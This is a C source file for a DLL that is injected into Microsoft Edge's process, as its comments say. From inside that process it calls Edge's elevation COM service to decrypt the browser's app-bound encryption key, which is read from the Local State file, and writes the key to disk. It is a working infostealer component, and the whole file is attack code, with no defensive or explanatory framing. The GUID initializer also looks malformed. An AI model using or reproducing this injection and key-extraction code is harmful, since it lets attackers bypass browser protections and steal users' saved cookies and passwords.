/* Minimal DLL: calls IElevator COM from inside msedge.exe context.
 * When loaded into msedge.exe, the elevation service sees a signed
 * Edge binary caller and accepts the DecryptData request. */
#include <windows.h>
#include <stdio.h>

#define CLSID_Elevator {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}}
#define IID_IEdge {0xC9C2B807,0x7731,0x4F34,0x81B7,0x44,0xFF,0x77,0x79,0x52,0x2B}

typedef struct _BLOB { DWORD cbData; BYTE *pbData; } BLOB;

typedef HRESULT (__stdcall *pfnDecryptData)(void*, BLOB*, BLOB*, DWORD*);

static void write_key_file(const char *path, BYTE *data, DWORD len) {
    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (f != INVALID_HANDLE_VALUE) { WriteFile(f, data, len, &(DWORD){0}, NULL); CloseHandle(f); }
}

static void do_work(void) {
    HRESULT hr;
    void *elevator = NULL;
    GUID clsid = CLSID_Elevator;
    GUID iid = IID_IEdge;
    BLOB in = {0}, out = {0};
    DWORD err = 0;

    /* Read app_bound_encrypted_key from Local State */
    FILE *f = fopen("C:\\Users\\admin\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", "rb");
    if (!f) { write_key_file("C:\\Tools\\key_out.txt", "ERR:no_local_state", 18); return; }
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    char *json = malloc(sz + 1); fread(json, 1, sz, f); fclose(f);

    /* Find "app_bound_encrypted_key" value in JSON */
    char *key_start = strstr(json, "app_bound_encrypted_key");
    if (!key_start) { free(json); write_key_file("C:\\Tools\\key_out.txt", "ERR:no_key_in_json", 19); return; }
    key_start = strstr(key_start, "\"");
    /* skip to value after colon */
    char *colon = strchr(key_start, ':');
    if (!colon) { free(json); return; }
    key_start = colon + 1;
    while (*key_start == ' ' || *key_start == '"') key_start++;
    char *key_end = strchr(key_start, '"');
    if (!key_end) { free(json); return; }
    int b64_len = key_end - key_start;
    char *b64 = malloc(b64_len + 1);
    memcpy(b64, key_start, b64_len); b64[b64_len] = 0;

    /* Base64 decode */
    DWORD bin_len = 0;
    CryptStringToBinaryA(b64, b64_len, CRYPT_STRING_BASE64, NULL, &bin_len, NULL, NULL);
    BYTE *bin = malloc(bin_len);
    CryptStringToBinaryA(b64, b64_len, CRYPT_STRING_BASE64, bin, &bin_len, NULL, NULL);
    free(b64); free(json);

    /* Strip APPB magic (4 bytes) */
    BYTE *dpapi_blob = bin + 4;
    DWORD dpapi_len = bin_len - 4;

    /* User DPAPI on outer layer */
    DATA_BLOB in_dp = {dpapi_len, dpapi_blob};
    DATA_BLOB out_dp = {0};
    if (!CryptUnprotectData(&in_dp, NULL, NULL, NULL, NULL, 0, &out_dp)) {
        write_key_file("C:\\Tools\\key_out.txt", "ERR:dpapi_outer", 15); return;
    }

    /* Now call IElevator DecryptData on the inner blob */
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, &iid, &elevator);
    if (FAILED(hr)) {
        char msg[64]; sprintf(msg, "ERR:cocreate:08%lX", (unsigned long)hr);
        write_key_file("C:\\Tools\\key_out.txt", msg, strlen(msg)); return;
    }

    /* Get vtable: IUnknown(3) + RunRecoveryCRXElevated + EncryptData + DecryptData = slot 5 */
    void **vtbl = *(void***)elevator;
    pfnDecryptData decrypt = (pfnDecryptData)vtbl[5];

    in.cbData = out_dp.cbData;
    in.pbData = out_dp.pbData;

    hr = decrypt(elevator, &in, &out, &err);
    if (SUCCEEDED(hr) && out.cbData > 0) {
        /* Write decrypted key as hex */
        char hex[128];
        for (DWORD i = 0; i < out.cbData && i < 32; i++)
            sprintf(hex + i*2, "%02X", out.pbData[i]);
        hex[out.cbData*2 < 128 ? out.cbData*2 : 128] = 0;
        write_key_file("C:\\Tools\\key_out.txt", hex, strlen(hex));
    } else {
        char msg[64]; sprintf(msg, "ERR:decrypt:08%lX", (unsigned long)hr);
        write_key_file("C:\\Tools\\key_out.txt", msg, strlen(msg));
    }

    if (out.pbData) LocalFree(out.pbData);
    if (elevator) IUnknown_Release(elevator);
    CoUninitialize();
}

/* DllMain - entry point when injected via LoadLibrary */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)do_work, NULL, 0, NULL);
    }
    return TRUE;
}

/* Also export as entry for CreateRemoteThread */
__declspec(dllexport) void __stdcall Bootstrap(LPVOID param) {
    do_work();
}